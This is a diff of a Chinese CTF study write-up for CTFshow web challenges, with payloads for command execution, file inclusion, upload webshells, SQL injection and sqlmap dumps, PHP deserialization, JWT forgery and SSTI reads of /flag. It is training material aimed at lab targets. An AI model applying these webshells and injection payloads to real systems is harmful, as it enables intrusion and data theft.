@@ -30,7 +30,7 @@
 
 ### <font color='orange'>web29-web36+web40</font>
 
-+++
+
 
 #### 29
 
@@ -350,11 +350,11 @@ POST`1=phpinfo();`
 
 可以看到里面有个cookie参数，所以本题其实也可以**cookie注入**(具体参考[GXYCTF2019]禁止套娃)
 
-+++
+
 
 ### <font color='orange'>web37-web39</font>
 
-+++
+
 
 #### 37
 
@@ -445,11 +445,11 @@ if(isset($_GET['c'])){
 
 用上面的方法都可以，只是这个后缀会被打印出来
 
-+++
+
 
 ### <font color='orange'>web41(脚本题)(未完全懂)</font>
 
-+++
+
 
 ```php
 <?php
@@ -572,11 +572,11 @@ while True:
 > 通俗解释：
 > 例如源码中禁止我们使用了数字3，也就是ascii码值为51，我们可以使用或运算符在没有被禁止的字符中构造出51来，比如19和32没有被禁止，我们进行或运算19|32=51，就可以获得51这个ascii码值，也就是成功得到了数字3
 
-+++
+
 
 ### <font color='orange'>web42-web54</font>
 
-+++
+
 
 #### 42
 
@@ -848,11 +848,11 @@ if(isset($_GET['c'])){
 
 在flag.php中搜索有show的一行并输出
 
-+++
+
 
 ### <font color='orange'>web55</font>
 
-+++
+
 
 #### 55
 
@@ -960,11 +960,11 @@ if(isset($_GET['c'])){
 
 过滤了数字，上题的解法一依然可用
 
-+++
+
 
 ### <font color='orange'>web57</font>
 
-+++
+
 
 ```php
 <?php
@@ -1002,11 +1002,11 @@ print(data)
 #结果：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
 ```
 
-+++
+
 
 ### <font color='orange'>web58-web</font>
 
-+++
+
 
 下面一部分考的是**绕过disable_functions系列**，尽量用不同的办法
 
@@ -1348,15 +1348,15 @@ if(isset($_POST['c'])){
 
 后面的暂时放着吧...开新坑了
 
-+++
+
 
 ## 文件包含
 
-+++
+
 
 ### web78
 
-+++
+
 
 ```php
 <?php
@@ -1720,7 +1720,7 @@ if(test.status_code == 200):
 
 ### <font color='orange'>web89-95</font>
 
-+++
+
 
 #### 89
 
@@ -1873,11 +1873,11 @@ if(isset($_GET['num'])){
 
 但?num= 010574可以
 
-+++
+
 
 ### <font color='orange'>web91</font>
 
-+++
+
 
 两个相似的正则的绕过
 
@@ -1908,11 +1908,11 @@ else{
 
 即构造payload    `?cmd=%0aphp`   就可绕过
 
-+++
+
 
 ### <font color='orange'>web96</font>
 
-+++
+
 
 ```php
 <?php
@@ -1943,11 +1943,11 @@ http://18c36440-a34b-404b-927e-62a60676f666.challenge.ctf.show/?u=../../../.././
 
 绝对路径可以看报错信息来得知
 
-+++
+
 
 ### <font color='orange'>web97</font>
 
-+++
+
 
 ```php
 <?php
@@ -1967,7 +1967,7 @@ md5弱类型绕过
 
 直接传输组就行
 
-+++
+
 
 ### <font color='orange'>web98</font>
 
@@ -2000,11 +2000,11 @@ $_POST同理
 
 ![image-20220523152308667](D:\Typora\note\CTF\web\CTFshow_vip.assets\image-20220523152308667.png)
 
-+++
+
 
 ### <font color='orange'>web99</font>
 
-+++
+
 
 ```php
 <?php
@@ -2075,11 +2075,11 @@ file_put_contents ( string filename, string data [, int flags [, resource contex
 
 木马写进就easy啦~
 
-+++
+
 
 ### <font color='orange'>web100-web101</font>
 
-+++
+
 
 #### 100
 
@@ -2190,11 +2190,11 @@ flag手动转换一下发现缺一位，手动爆破一下就好(16进制 只有
 
 1d77656b-3d33-4b7c-8ae1-e69178dbced
 
-+++
+
 
 ### <font color='orange'>web102(不太懂)</font>
 
-+++
+
 
 ```php
 <?php
@@ -2241,11 +2241,11 @@ base64_decode($str)=<?=`cat *`;
 
 **说明：<?=是php的短标签，是echo()的快捷用法**
 
-+++
+
 
 ### <font color='orange'>web103(不太懂)</font>
 
-+++
+
 
 ```php
 <?php
@@ -2280,11 +2280,11 @@ else{
 
 还是不懂😭
 
-+++
+
 
 ### <font color='orange'>web104-web107</font>
 
-+++
+
 
 #### 104
 
@@ -2372,11 +2372,11 @@ GET`?v3=240610708`加密后0e开头，相当于0
 
 POST`v1=flag=0`
 
-+++
+
 
 ### <font color='orange'>web105</font>
 
-+++
+
 
 ```php
 <?php
@@ -2422,11 +2422,11 @@ die($suces);
 
 `error=suces`
 
-+++
+
 
 ### <font color='orange'>web108</font>
 
-+++
+
 
 ```php
 <?php
@@ -2461,7 +2461,7 @@ PHP函数ereg()内容说明
 
 所以可以用`?c=a%00778`来得到flag
 
-+++
+
 
 ### <font color='orange'>web109-110</font>
 
@@ -2591,11 +2591,11 @@ foreach ($dir as $fileinfo) {
 
 直接访问就可得到flag
 
-+++
+
 
 ### <font color='orange'>web111</font>
 
-+++
+
 
 ```php
 <?php
@@ -2636,11 +2636,11 @@ if(isset($_GET['v1']) && isset($_GET['v2'])){
 
 就可得到flag
 
-+++
+
 
 ### <font color='orange'>web112-web114</font>
 
-+++
+
 
 #### 112
 
@@ -2762,11 +2762,11 @@ if(! is_file($file)){
 
 **新知识**:`?file=glob://flag.php`返回的是数组，所以**highlight_file**用不了
 
-+++
+
 
 ### <font color='orange'>web115</font>
 
-+++
+
 
 ```php
 <?php
@@ -2820,11 +2820,11 @@ if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'
 
 所以%0c完全可以绕过
 
-+++
+
 
 ### <font color='orange'>web123-web126</font>
 
-+++
+
 
 #### 123
 
@@ -2911,11 +2911,11 @@ array(7) {
 }
 ```
 
-+++
+
 
 #### 125
 
-+++
+
 
 ```php
 <?php
@@ -3075,7 +3075,7 @@ assert(mixed $assertion, Throwable $exception = ?): bool
 
 好像是个很厉害的函数哦
 
-+++
+
 
 ### <font color='orange'>web127</font>
 
@@ -3113,7 +3113,7 @@ if($ctf_show==='ilove36d'){
 
 空格没被过滤,GET传`?ctf show=ilove36d`就好了
 
-+++
+
 
 ### <font color='orange'>web128</font>
 
@@ -3162,11 +3162,11 @@ echo _("ctfshownb");
 
 于是,GET`?f1=_&f2=get_defined_vars`
 
-+++
+
 
 ### <font color='orange'>web129</font>
 
-+++
+
 
 <font color='purple'>**stripos**</font>
 
@@ -3218,11 +3218,11 @@ echo _("ctfshownb");
 ?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
 ```
 
-+++
+
 
 ### <font color='orange'>web130</font>
 
-+++
+
 
 ```php
 <?php
@@ -3250,11 +3250,11 @@ if(isset($_POST['f'])){
 
 所以直接POST传`f=ctfshow`就过了
 
-+++
+
 
 ### <font color='orange'>web131(脚本题)</font>
 
-+++
+
 
 ```php
 <?php
@@ -3331,11 +3331,11 @@ print(res.text)
 </code>ctfshow{f0d945be-370c-4034-ba39-8ea1b0195d80}
 ```
 
-+++
+
 
 ### <font color='orange'>web132</font>
 
-+++
+
 
 扫后台发现robots.txt 里面有admin(自己骗自己😭😭，不知道为什么根本扫不出来)
 
@@ -3377,11 +3377,11 @@ payload
 
 rd8wr4hg06pkskyz02g51550trzin7.oastify.com
 
-+++
+
 
 ### <font color='orange'>web133-web135(不太懂)</font>
 
-+++
+
 
 #### 133
 
@@ -3453,11 +3453,11 @@ ctfshow给的payload，没打通
 
 命令暂时也不懂
 
-+++
+
 
 ### <font color='orange'>web134</font>
 
-+++
+
 
 ```php
 <?php
@@ -3532,11 +3532,11 @@ var_dump($_POST)
 
 然后**extract**就可以把key1和key2解析成变量了
 
-+++
+
 
 ### <font color='orange'>web136</font>
 
-+++
+
 
 ```php
 <?php
@@ -3571,11 +3571,11 @@ else{
 
 wp视频介绍了一种骚姿势，看不太懂...
 
-+++
+
 
 ### <font color='orange'>web137-web</font>
 
-+++
+
 
 #### 137
 
@@ -3673,15 +3673,15 @@ call_user_func($_POST['ctfshow']);
 
 一个变量名，一个函数方法
 
-+++
+
 
 ## 文件上传
 
-+++
+
 
 ### web151
 
-+++
+
 
 页面提示本题为前台验证，发个空图片，bp抓包，然后放入repeater改文件后缀，加入一句话木马即可。
 
@@ -3692,19 +3692,19 @@ call_user_func($_POST['ctfshow']);
 >
 > 命令提示符输入`copy 1.png/b+1.php/a 2.png`得到图片马
 
-+++
+
 
 ### web152
 
-+++
+
 
 与上题基本一致
 
-+++
+
 
 ### web153
 
-+++
+
 
 本题需要用到`.user.ini`文件
 
@@ -3723,11 +3723,11 @@ auto_append_file=filename       //包含在文件尾
 
 然后再访问`/upload`因为`/upload`中有`index.php`，所以该一句话木马就成功执行
 
-+++
+
 
 ### web154
 
-+++
+
 
 与上题相比，文件内容过滤了php，使用短标签即可
 
@@ -3767,46 +3767,46 @@ auto_append_file=filename       //包含在文件尾
 
 不需要修改参数开关，但是只能在7.0以下可用。
 
-+++
+
 
 ### web155
 
-+++
+
 
 用上题的方法可以通过
 
-+++
+
 
 ### web156
 
-+++
+
 
 又多过滤了`[ ]`，改成`{ }`即可
 
 一句话木马后面记得加`exit;`，然后`flag.php改成f*`
 
-+++
+
 
 ### web157
 
-+++
+
 
 过滤了`{ }`和分号，直接在图片马中执行`<?=system('cat ../f*')?>`算了，反正知道flag位置
 其他步骤照常
 
-+++
+
 
 ### web158
 
-+++
+
 
 与上题一样
 
-+++
+
 
 ### web159
 
-+++
+
 
 过滤了括号，用反引号来绕过
 
@@ -3814,11 +3814,11 @@ auto_append_file=filename       //包含在文件尾
 <?=`tac ../f*`>? 
 ```
 
-+++
+
 
 ### web160
 
-+++
+
 
 又过滤了反引号和空格
 
@@ -3844,21 +3844,21 @@ payload
 <?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?>
 ```
 
-+++
+
 
 ### web161
 
-+++
+
 
 相对于上题多了一个文件头检测
 
 在前面多加一行`GIF89A`就可以了
 
-+++
+
 
 ### web162
 
-+++
+
 
 首先上传一个`.user.ini`，此时`/upload`的文件夹下的**php文件**都会在文件头包含进`/tmp/sess_xl`，也就是我们之后准备进行**session**上传的文件，而正好`/upload`目录下有一个**index.php**，所以无需额外上传**php**文件(因为你也上传不上去)
 
@@ -3897,7 +3897,7 @@ if __name__ == '__main__':
         threading.Thread(target=read, args=(session,)).start()
 ```
 
-+++
+
 
 ### web163
 
@@ -3911,25 +3911,13 @@ if __name__ == '__main__':
 
 ![image-20221223151802508](CTFshow_vip.assets/image-20221223151802508.png)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+ 
 
 ## sql注入
 
 ### <font color='orange'>web174</font>
 
-+++
+
 
 ![image-20220518204450251](D:\Typora\note\CTF\web\CTFshow_vip.assets\image-20220518204450251.png)
 
@@ -3961,19 +3949,19 @@ if __name__ == '__main__':
 利用盲注脚本(因为ctfshow有限制，bp爆破会报错)
 ```
 
-+++
+
 
 ### <font color='orange'>web175</font>
 
-+++
+
 
 利用上面的第二种办法即可
 
-+++
+
 
 ### <font color='orange'>web177-web182(部分含过滤的注入)</font>
 
-+++
+
 
 #### 177
 
@@ -4035,11 +4023,11 @@ if __name__ == '__main__':
 >
 > 
 
-+++
+
 
 ### web183
 
-+++
+
 
 进入页面根据提示，POST传参，以前的题表名为`ctfshow_user`，所以先输一次试试
 
@@ -4073,7 +4061,7 @@ for i in range(0,666):
             break
 ```
 
-+++
+
 
 ### web184
 
@@ -4145,7 +4133,7 @@ post:tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x6
 
 成功回显1，脚本和上题差不多，就mysql语句有变化
 
-+++
+
 
 ### web185
 
@@ -4195,19 +4183,19 @@ for i in range(0,666):
             break
 ```
 
-+++
+
 
 ### web186
 
-+++
+
 
 过滤的变多了，但不影响上题的payload，继续用上题的脚本打通
 
-+++
+
 
 ### web187
 
-+++
+
 
 ![image-20220713144351438](D:\Typora\note\CTF\web\CTFshow_vip.assets\image-20220713144351438.png)
 
@@ -4228,11 +4216,11 @@ password=''or true
 
 所以成功绕过
 
-+++
+
 
 ### web188
 
-+++
+
 
 ```php
  $sql = "select pass from ctfshow_user where username = {$username}";
@@ -4252,11 +4240,11 @@ password=''or true
 
 直接`username=1||1`绕过即可
 
-+++
+
 
 ### web189
 
-+++
+
 
 
 
@@ -4331,11 +4319,11 @@ for i in range(0,666):
 
 
 
-+++
+
 
 ### web190
 
-+++
+
 
 ```php
  //密码检测
@@ -4383,11 +4371,11 @@ for i in range(1,46):
             break
 ```
 
-+++
+
 
 ### web191
 
-+++
+
 
 ```php
   //密码检测
@@ -4439,11 +4427,11 @@ for i in range(1,46):
 
 ```
 
-+++
+
 
 ### web192
 
-+++
+
 
 ```php
  //密码检测
@@ -4495,11 +4483,11 @@ for i in range(1,46):
 
 ```
 
-+++
+
 
 ### web193
 
-+++
+
 
 ```php
   //密码检测
@@ -4552,11 +4540,11 @@ for i in range(1,46):
 
 ```
 
-+++
+
 
 ### web194
 
-+++
+
 
 ```php
 //TODO:感觉少了个啥，奇怪
@@ -4596,11 +4584,11 @@ for i in range(1,46):
 
 ```
 
-+++
+
 
 ### web195
 
-+++
+
 
 ```php
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
@@ -4626,11 +4614,11 @@ for i in range(1,46):
 
 **表名、字段名、数据库名等可用反引号 ( ` )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错**。
 
-+++
+
 
 ### web196
 
-+++
+
 
 ```php
 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
@@ -4658,11 +4646,11 @@ username=520;select(1);
 password=1
 ```
 
-+++
+
 
 ### web197
 
-+++
+
 
 ```php
 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
@@ -4685,11 +4673,11 @@ password=ctfshow_user
 
 其他虚拟表绕过的办法没试，后面可以试试
 
-+++
+
 
 ### web198
 
-+++
+
 
 ```php
 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
@@ -4701,11 +4689,11 @@ if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|crea
 
 同上
 
-+++
+
 
 ### web199
 
-+++
+
 
 ```php
 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
@@ -4717,11 +4705,11 @@ if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|crea
 
 同上
 
-+++
+
 
 ### web200
 
-+++
+
 
 ```php
 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
@@ -4733,11 +4721,11 @@ if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|crea
 
 同上
 
-+++
+
 
 ### web201
 
-+++
+
 
 接下来是`sqlmap`的使用，先抓下包看看怎么传参的
 
@@ -4785,11 +4773,11 @@ sqlmap.py -u http://4d34566a-f81f-40c6-934c-cd2fe4ca80da.challenge.ctf.show/api/
 sqlmap.py -u http://4d34566a-f81f-40c6-934c-cd2fe4ca80da.challenge.ctf.show/api/?id=1 -referer="ctf.show" -D ctfshow_web -T ctfshow_user --dump
 ```
 
-+++
+
 
 ### web202
 
-+++
+
 
 提示是`POST`传参，但是抓包之后看的是`GET`传参
 
@@ -4808,11 +4796,11 @@ sqlmap.py -u http://4d34566a-f81f-40c6-934c-cd2fe4ca80da.challenge.ctf.show/api/
 sqlmap.py -u http://a00fd7b6-1171-41e4-8d64-8a338f01422a.challenge.ctf.show/api/ --data="id=1" --refer="ctf.show" -D ctfshow_web -T ctfshow_user --dump
 ```
 
-+++
+
 
 ### web203
 
-+++
+
 
 提示`使用--method 调整sqlmap的请求方式`
 
@@ -4835,11 +4823,11 @@ sqlmap.py -u http://3acac1ab-1b8f-4a14-9b05-6e1f06351057.challenge.ctf.show/api/
 
 这里使用PUT请求，但是要记得加上设置`Content-Type`头，否则会变成表单提交(不太懂PUT)
 
-+++
+
 
 ### web204
 
-+++
+
 
 提示`使用--cookie 提交cookie数据`
 
@@ -4849,11 +4837,11 @@ sqlmap.py -u http://3acac1ab-1b8f-4a14-9b05-6e1f06351057.challenge.ctf.show/api/
 sqlmap.py -u http://65fc3648-9bc2-462f-8156-b37818872701.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --headers="Content-Type: text/plain" --referer="ctf.show" -D ctfshow_web -T ctfshow_user --dump --cookie="PHPSESSID=a810gml01o3gv2c1vvs3umpaon; ctfshow=7a925fa293045407f0f14d4a9fa15428"
 ```
 
-+++
+
 
 ### web205
 
-+++
+
 
 提示`api调用需要鉴权`
 
@@ -4878,11 +4866,11 @@ bp抓包时发现在查询之前有一个
 sqlmap.py -u http://3acce2f0-9c3a-41cc-9f26-208242763f66.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer="ctf.show" --headers="Content-Type:text/plain" --safe-url="http://3acce2f0-9c3a-41cc-9f26-208242763f66.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump
 ```
 
-+++
+
 
 ### web206
 
-+++
+
 
 提示sql要闭合，sqlmap会自动闭合的
 
@@ -4890,21 +4878,21 @@ sqlmap.py -u http://3acce2f0-9c3a-41cc-9f26-208242763f66.challenge.ctf.show/api/
 sqlmap.py -u http://4a58864b-f239-4ad1-85d9-650f955ab369.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer="ctf.show" --headers="Content-Type:text/plain" --safe-url="http://4a58864b-f239-4ad1-85d9-650f955ab369.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump 
 ```
 
-+++
+
 
 ### web207
 
-+++
+
 
 下面的进入了写tamper时代，鉴于python还未深入学习，先放一段落，开始反序列化的学习吧！
 
-+++
+
 
 ## 反序列化
 
 ### web254
 
-+++
+
 
 ```php
 <?php
@@ -4957,7 +4945,7 @@ if(isset($username) && isset($password)){
 http://dff03a0a-b00b-4144-8e3b-ee8638169671.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
 ```
 
-+++
+
 
 ### web255
 
@@ -5018,11 +5006,11 @@ print_r(urlencode(serialize(new ctfShowUser())));
 url:http://0a3030e3-fdcf-4bca-a019-e40e9d04c71d.challenge.ctf.show/?username=1&password=1
 ```
 
-+++
+
 
 ### web256
 
-+++
+
 
 ```php
 <?php
@@ -5083,11 +5071,11 @@ O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22aaa%22%3
 url=http://e95114d3-ba53-4c00-840f-09b586f61797.challenge.ctf.show/?username=aaa&password=bbb
 ```
 
-+++
+
 
 ### web257
 
-+++
+
 
 ```php
 <?php
@@ -5187,11 +5175,11 @@ echo urlencode(serialize($b));
 
 ```
 
-+++
+
 
 ### web258
 
-+++
+
 
 ```php
 <?php
@@ -5282,11 +5270,11 @@ echo urlencode($a);
 
 这样就可随意rce了
 
-+++
+
 
 ### web259
 
-+++
+
 
 先放一下
 
@@ -5294,11 +5282,11 @@ echo urlencode($a);
 
 
 
-+++
+
 
 ### web260
 
-+++
+
 
 ```php
 <?php
@@ -5316,11 +5304,11 @@ if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
 
 直接传`?ctfshow=ctfshow_i_love_36D`即可
 
-+++
+
 
 ### web261
 
-+++
+
 
 ```php
 <?php
@@ -5386,11 +5374,11 @@ $a=new ctfshowvip('877.php','<?php eval($_POST[1]);?>');
 echo serialize($a);
 ```
 
-+++
+
 
 ### web262
 
-+++
+
 
 > **字符串逃逸**
 >
@@ -5542,19 +5530,19 @@ object(message)#1 (4) {
 
 然后base64加密一下在message传cookie就可以了
 
-+++
+
 
 ### web263
 
-+++
+
 
 **session反序列化**
 
-+++
+
 
 ### web264
 
-+++
+
 
 index.php
 
@@ -5640,11 +5628,11 @@ message.php
 Cookie 加上 msg= xxx
 ```
 
-+++
+
 
 ### web265
 
-+++
+
 
 利用到地址的思想
 
@@ -5678,11 +5666,11 @@ echo serialize(new ctfshowAdmin());
 //O:12:"ctfshowAdmin":2:{s:5:"token";s:1:"a";s:8:"password";R:2;}
 ```
 
-+++
+
 
 ### web266
 
-+++
+
 
 ```php
 <?php
@@ -5735,11 +5723,11 @@ if(preg_match('/ctfshow/', $cs)){
 > 值得一提的是，这种不是等式的POST提交方式，不能直接用**chrome的hackbar**，用**postwoman**就好啦
 > ![image-20220724011558133](D:\Typora\note\CTF\web\CTFshow_vip.assets\image-20220724011558133.png)
 
-+++
+
 
 ### web267
 
-+++
+
 
 记得看看wp视频
 yii反序列化漏洞
@@ -5796,11 +5784,11 @@ namespace{
 最后上面的payload成功的写进了马(双引号包着，还有转义)
 后面的几题都是些不用脑子的链子题，先放着吧
 
-+++
+
 
 ### web275
 
-+++
+
 
 ```php
 <?php
@@ -5890,7 +5878,7 @@ POST:flag=123
 
 ## jwt
 
-+++
+
 
 **ctfshow的学习近期有些停滞，开启新章节！**
 
@@ -5994,7 +5982,7 @@ eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ
 
 ### web345
 
-+++
+
 
 进入题目查看源码，发现`/admin`
 访问后卡一段时间然后看cookie发现生成了jwt
@@ -6009,11 +5997,11 @@ eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ
 
 可能是群主犯了个小错误吧
 
-+++
+
 
 ### web346
 
-+++
+
 
 同样的jwt，只不过这次有了签名认证
 绕过签名认证的两种办法
@@ -6071,11 +6059,11 @@ print(jwt_token)
 
 不太懂原理
 
-+++
+
 
 ## SSTI
 
-+++
+
 
 ### web361
 
@@ -6204,8 +6192,6 @@ payload
 cookie
 x1=__builtins__
 x2=__import__('os').popen('cat /flag').read()
-
-
 ```
 
 ### web365
@@ -6493,7 +6479,7 @@ http://ec6b99bb-953a-4e28-8962-084bda49c739.chall.ctf.show/
 {% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%}
 {%print(x.open(file).read())%}
 
-前面分别是 0 1 2 3 4 5 6 7 8 9 10 后面就是随意拼接了
+前面分别是 1 2 3 4 5 6 7 8 9 10 后面就是随意拼接了
 ```
 
 ### web371
